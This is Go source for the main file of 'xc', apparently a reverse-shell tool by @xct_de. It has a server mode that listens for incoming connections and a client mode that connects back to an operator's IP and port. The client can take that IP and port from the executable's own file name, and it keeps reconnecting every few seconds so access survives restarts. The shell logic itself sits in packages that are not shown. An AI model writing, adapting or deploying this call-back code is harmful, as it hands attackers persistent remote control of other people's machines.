package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"./client"
	"./server"
	"github.com/hashicorp/yamux"
)

//go:generate go run scripts/includekeys.go

func usage() {
	fmt.Printf("Usage: \n")
	fmt.Printf("- Client: xc <ip> <port>\n")
	fmt.Printf("- Server: xc -l -p <port>\n")
}

func main() {
	listenPtr := flag.Bool("l", false, "use as server")
	portPtr := flag.Int("p", 1337, "port to listen on, default 1337")
	flag.Parse()

	rand.Seed(time.Now().UnixNano())
	if *listenPtr {
		// banner
		banner := `
		__  _____ 
		\ \/ / __|
		>  < (__ 
		/_/\_\___| by @xct_de
			`
		fmt.Println(banner)

		// server mode
		listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", *portPtr))
		if err != nil {
			log.Fatalln("Unable to bind to port")
		}
		log.Printf("Listening on :%d\n", *portPtr)

		for {
			log.Println("Waiting for connections...")
			conn, err := listener.Accept()
			if err != nil {
				log.Println("Unable to accept connection")
				continue
			}
			log.Printf("Connection from %s\n", conn.RemoteAddr().String())
			session, err := yamux.Server(conn, nil)
			if err != nil {
				log.Println(err)
				continue
			}
			signal.Notify(make(chan os.Signal))
			stream, err := session.Accept()
			if err != nil {
				log.Println(err)
				continue
			}
			log.Printf("Stream established")
			server.Run(session, stream)
			signal.Reset(syscall.SIGINT)
			conn.Close()
		}
	} else {
		// client mode
		var (
			ip   string
			port string
		)
		init := false
		if flag.NArg() < 2 {
			// arguments inside the binaries name? (thanks @jkr)
			name := os.Args[0]
			parts := strings.Split(name, "_")
			if len(parts) == 3 {
				ip = parts[1]
				port = strings.TrimRight(parts[2], ".exe")
				fmt.Printf("Detected client arguments from executable name: %s:%s\n", ip, port)
				init = true
			} else {
				usage()
				os.Exit(1)
			}
		}
		if !init {
			ip = flag.Arg(0)
			port = flag.Arg(1)
		}
		// keep connecting (in case the server is exiting ungracefully we can just restart it and get a connection back)
		for {
			conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", ip, port))
			if err != nil {
				log.Println("Couldn't connect. Trying again...")
				time.Sleep(3000 * time.Millisecond)
				continue
			}
			log.Printf("Connected to %s\n", conn.RemoteAddr().String())
			session, err := yamux.Client(conn, nil)
			if err != nil {
				log.Fatalln(err)
				continue
			}
			stream, err := session.Open()
			if err != nil {
				log.Fatalln(err)
				continue
			}
			client.Run(session, stream)
			time.Sleep(5000 * time.Millisecond)
		}
	}
}
